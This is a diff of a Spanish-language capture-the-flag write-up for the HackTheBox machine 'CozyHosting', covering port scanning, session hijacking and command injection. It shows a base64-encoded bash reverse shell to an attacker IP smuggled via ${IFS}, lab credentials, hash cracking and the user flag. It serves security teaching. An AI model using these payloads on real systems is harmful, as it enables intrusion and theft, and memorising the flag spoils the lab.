@@ -25,12 +25,18 @@ Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
            Raw packets sent: 71989 (3.168MB) | Rcvd: 71791 (2.872MB)
 ```
 
+<br>
+
 ```bash
 nvim /etc/hosts
 cozyhosting.htb
 ```
 
+<br>
+
 [http://cozyhosting.htb/](http://cozyhosting.htb/)
+
+<br>
 
 `nmap -p 22,80,8000,8888 -n -Pn -sCV --min-rate 5000 10.10.11.230 -oN targeted`
 
@@ -56,6 +62,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 99.85 seconds
 ```
+
+<br>
 
 `gobuster dir -u http://cozyhosting.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20`
 
@@ -89,6 +97,8 @@ Progress: 66949 / 220561 (30.35%)               ^C
 2023/12/09 20:42:46 Finished
 ===============================================================
 ```
+
+<br>
 
 `dirsearch -u http://cozyhosting.htb`
 
@@ -131,6 +141,8 @@ Task Completed
 <dirsearch.dirsearch.Program object at 0x7f4c978d4b80>
 ```
 
+<br>
+
 [http://cozyhosting.htb/actuator/sessions](http://cozyhosting.htb/actuator/sessions)
 
 ```bash
@@ -140,9 +152,13 @@ AB7F8F8A0FC69FF5B97CB969B3A1298F	"UNAUTHORIZED"
 F99CF05847D0C79B554F3C58AAFC0D7A	"kanderson"
 ```
 
+<br>
+
 `JSESSIONID:"F99CF05847D0C79B554F3C58AAFC0D7A"`
 
 [http://cozyhosting.htb/admin](http://cozyhosting.htb/admin)
+
+<br>
 
 ```bash
 echo "bash -i >& /dev/tcp/<ip-atacante>/<puerto> 0>&1" | base64
@@ -150,6 +166,8 @@ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNzc3NyAwPiYxCg==" | base64 -d 
 ;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg=="|base64${IFS}-d|bash;
 %3becho${IFS}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNDYvNDE0MiAwPiYxCg%3d%3d"|base64${IFS}-d|bash%3b
 ```
+
+<br>
 
 Tratamiento de la TTY
 ```bash
@@ -162,6 +180,8 @@ export SHELL=bash
 stty rows 44 columns 184
 ```
 
+<br>
+
 ```bash
 cd /app
 ls -l
@@ -173,6 +193,8 @@ python3 -m http.server 80
 ```bash
 wget http://<ip-victima>/<port>/cloudhosting-0.0.1.jar
 ```
+
+<br>
 
 [https://java-decompiler.github.io/](https://java-decompiler.github.io/)
 
@@ -201,6 +223,8 @@ username -> kanderson
 password -> MRdEQuv6~6P9
 ```
 
+<br>
+
 `psql "postgresql://postgres:Vg&nvzAQ7XxR@127.0.0.1:5432/cozyhosting"`
 
 ```bash
@@ -216,6 +240,8 @@ SELECT * FROM users;
  admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
 ```
 
+<br>
+
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt admin
 
@@ -230,6 +256,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
+<br>
+
 ```bash
 su josh
 manchesterunited
@@ -242,6 +270,8 @@ cat user.txt
 
 > [!IMPORTANT]
 > User flag: c07db06d197bee1a21bfdad6494b6519
+
+<br>
 
 ```bash
 sudo -l
